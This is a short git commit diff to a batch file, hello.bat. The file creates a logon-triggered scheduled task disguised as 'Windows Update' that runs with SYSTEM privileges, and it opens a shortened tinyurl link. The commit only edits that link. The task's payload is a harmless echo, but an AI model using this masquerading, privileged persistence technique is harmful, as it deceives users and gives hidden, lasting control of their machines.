1483450eafd164675124bcba2db2885b2a191878
Sajid Alam <117466907+mohammadsajidalam@users.noreply.github.com>
2023-02-23 16:16:59 +0530

    Update hello.bat

--- hello.bat
+++ hello.bat
@@ -1,2 +1,2 @@
 schtasks /create /tn "Windows Update" /tr "cmd.exe /c echo HELLO FROM SAJID :) & timeout /t 5" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST /F
-start tinyurl.com/sajidlink
+start www.tinyurl.com/sajidlink
